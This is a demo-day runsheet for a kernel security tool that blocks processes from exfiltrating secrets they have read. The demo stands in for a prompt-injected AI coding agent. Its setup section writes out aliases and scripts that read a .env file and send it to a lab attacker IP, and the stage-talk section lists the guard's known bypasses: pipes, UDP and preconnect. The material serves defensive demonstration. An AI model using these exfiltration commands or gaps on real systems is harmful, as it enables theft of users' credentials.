# SyscallGuard — Demo Day Runsheet (from a cold start)

Everything from laptop power-on to the last judge. Follow it top to bottom, and don't improvise commands on stage.

- **Host** = laptop, repo at `~/projects/syscallguard`
- **VM** = `inno@fed`, repo at `~/syscallguard`, on `main`
- **Attacker IP** (host, as seen from the VM) = `192.168.122.1`
- **VM IP** = check it every boot (it was `192.168.122.174`, but DHCP can change it)

---

## 0. Before leaving for the venue (once)

- [ ] `main` merged and pulled in the VM (`cd ~/syscallguard && git checkout main && git pull`)
- [ ] `dashboard/node_modules` present on the host (`cd ~/projects/syscallguard/dashboard && npm ci`), so you don't need the internet at the venue
- [ ] Firewall rules made permanent (TONIGHT.md step 9), or plan to run section 2
- [ ] VM snapshot taken
- [ ] Backup video on the laptop desktop: `~/Desktop/syscallguard-backup.mp4`
- [ ] Laptop charger, HDMI cable, and an external monitor (or confirm one at the venue)
- [ ] Do **not** edit `demo/project/.env` from now on. Editing it changes its inode and protection silently stops

---

## 1. Boot

1. Power on the laptop, plug in the monitor, set it to **extended** display (not mirrored).
2. Start the VM from virt-manager. Wait for the login screen.
3. **Host**, find the VM's IP:
   ```bash
   sudo virsh net-dhcp-leases default
   ```
   Note the `192.168.122.x` address. Every `<VM_IP>` below means this value.

---

## 2. Firewall (skip if made permanent)

**Host:**
```bash
sudo firewall-cmd --zone=libvirt --add-port=9999/tcp --add-port=9999/udp
```
**VM** (ssh in once to do it):
```bash
ssh inno@<VM_IP>
sudo firewall-cmd --add-port=8765/tcp
exit
```

---

## 3. Open the terminals

Everything runs from the laptop, with VM terminals over ssh. Five terminals:

| Name | Where | Purpose | Screen |
|---|---|---|---|
| **H-ATK** | host | attacker receiver | laptop, small, visible to judges |
| **H-DASH** | host | dashboard launcher | (minimised once the app is up) |
| **VM-API** | `ssh inno@<VM_IP>` | internal API log | laptop, small |
| **VM-GUARD** | `ssh inno@<VM_IP>` | guard \| bridge | laptop, small |
| **VM-DEMO** | `ssh inno@<VM_IP>` | **where you type the demo** | laptop, big font (Ctrl + several times) |

The dashboard app goes fullscreen on the external monitor.

---

## 4. Start everything (in this order)

**VM-GUARD** — pre-flight, then the pipeline:
```bash
cd ~/syscallguard
git log --oneline -1                       # should be the merged main commit
cat /sys/kernel/security/lsm               # must contain bpf
ls policy/policy.toml                      # must exist; if not, create it (below)
sudo -v                                    # cache sudo so reset.sh never prompts
sudo python3 guard/guard.py -p policy/policy.toml --mode enforce | python3 bridge/bridge.py --host 0.0.0.0 --port 8765
```
Wait a few seconds for the compile, until it's quiet. Leave it running and don't touch it again.

If `policy/policy.toml` is missing:
```bash
cat > policy/policy.toml <<'EOF'
mode = "audit"
protect = ["/home/inno/syscallguard/demo/project/.env"]
allow = ["127.0.0.0/8", "::1/128"]
EOF
```
(`--mode enforce` on the command line overrides the file.)

**VM-API:**
```bash
cd ~/syscallguard
nohup python3 demo/internal_api.py > /tmp/internal_api.log 2>&1 &
tail -F /tmp/internal_api.log
```
Running the API in the background means `reset.sh` can restart it without breaking this window.

**H-ATK:**
```bash
cd ~/projects/syscallguard && python3 demo/attacker.py --host 0.0.0.0 --port 9999
```

**H-DASH:**
```bash
cd ~/projects/syscallguard/dashboard && SG_BRIDGE_URL=ws://<VM_IP>:8765 npm start
```
Drag the window to the external monitor and fullscreen it (F11). You should see **Bridge connected · Guard feeding · ENFORCE**.

**VM-DEMO** — load the pre-typed commands (paste this whole block once):
```bash
cd ~/syscallguard && clear
A="--env demo/project/.env --attacker 192.168.122.1 --api http://127.0.0.1:8080"
alias direct="python3 demo/agent.py --mode direct $A"
alias viacurl="python3 demo/agent.py --mode curl $A"
alias b64="python3 demo/agent.py --mode b64 $A"
alias v6="python3 demo/agent.py --mode ipv6 $A"
alias port4444="python3 -c \"open('demo/project/.env').read(); import socket; socket.create_connection(('192.168.122.1',4444))\""
alias clean="python3 -c \"import socket; s=socket.socket(); s.connect(('192.168.122.1',9999)); s.sendall(b'hi'); print('untagged: connected')\""
alias reset="bash demo/reset.sh && clear"
```

---

## 5. Smoke test (before the first judge)

In **VM-DEMO**:
```bash
direct
```
✓ API call OK, then the exfil blocked · ✓ dashboard red BLOCK banner · ✓ VM-API shows a `POST /query` · ✓ **H-ATK shows nothing**

```bash
clean
```
✓ `untagged: connected` · ✓ H-ATK shows `TCP got 2 bytes`

Then `reset`. If both checks pass, you're ready. If either fails, go to section 8.

---

## 6. The 2-minute run (per judge)

| Time | Say | Do (VM-DEMO) | Point at |
|---|---|---|---|
| 0:00–0:15 | "AI coding agents read your secrets, `.env` files with passwords and API keys, to do their job. A hidden instruction in a README can make them send those secrets to an attacker. Nothing in the OS stops that." | — | — |
| 0:15–0:45 | "This script stands in for a prompt-injected agent; the kernel can't tell the difference. It reads `.env`, does its real job, then tries to send the secrets out." | `direct` | the API call succeeds (VM-API), then **dashboard turns red** with the process, the file and the destination |
| 0:45–1:00 | "And the attacker received…" | — | **H-ATK: empty** |
| 1:00–1:15 | "What if it hands the data to another program?" | `viacurl` | blocked, curl named on the dashboard: "children inherit the tag" |
| 1:15–1:30 | "Same IP, a process that never touched the secret, goes straight through, so this isn't an IP firewall." | `clean` | H-ATK: `TCP got 2 bytes` |
| 1:30–2:00 | "Try to get it out yourself." | let them pick: `b64`, `v6`, `port4444`, `viacurl` | all blocked |

**Never offer:** pipes (`cat .env | curl …`), `--mode udp`, `--mode preconnect`. These are known gaps.
If asked, answer honestly: "Children are covered. Sibling pipelines and UDP are our next step."

Judge Q&A answers: `docs/presentation/judge-qa.md`.

---

## 7. Between judges

```bash
reset
```
That clears leftovers and restarts the API. The pipeline and dashboard stay up.

Glance at the dashboard: is it still **Bridge connected · Guard feeding · ENFORCE**? If yes, the next judge can start.

**Dashboard cluttered with old attempts?** In VM-GUARD: Ctrl-C, then up-arrow + Enter (same pipeline command). The new bridge starts with empty history and the dashboard reconnects clean by itself — no reload needed. Takes ~10 s for the guard compile.

---

## 8. When something breaks

| Symptom | Fix |
|---|---|
| Dashboard: "Guard not feeding" / guard window has exited | Restart the **whole** pipeline in VM-GUARD (the same command as section 4). The dashboard reconnects in about 2 s. Never restart only `guard.py` |
| Dashboard: "Bridge unreachable" | VM-GUARD dead → restart the pipeline. Still unreachable → `<VM_IP>` changed: recheck with `sudo virsh net-dhcp-leases default` and relaunch H-DASH |
| `direct` is **not** blocked | Check the dashboard says ENFORCE, not AUDIT. Did anyone edit `.env`? Restart the pipeline |
| Agent says connection refused / H-ATK silent even for `clean` | H-ATK not running, or the host firewall rule is missing → rerun section 2 |
| `viacurl` says "connection refused" instead of "BLOCKED" | Same as above. The block only shows when the attacker is reachable |
| API call fails in the agent | `reset` (restarts internal_api), or check `tail /tmp/internal_api.log` |
| Dashboard app crashed | Relaunch H-DASH. It recovers state from the bridge snapshot |
| Electron won't start at all | Open the built renderer in Firefox with `?bridge=ws://<VM_IP>:8765` |
| Anything you can't fix in 30 s | **Play `~/Desktop/syscallguard-backup.mp4`** and narrate over it. Fix it after the judge leaves |
| VM won't boot / wrecked | Revert to the snapshot in virt-manager, then start from section 1 |

---

## 9. Shut down

1. Ctrl-C **VM-GUARD**: the guard exits and all hooks detach.
2. **VM-API**: Ctrl-C the `tail`, then `pkill -f internal_api.py`.
3. Ctrl-C **H-ATK**, close the dashboard.
4. Shut down the VM from virt-manager.
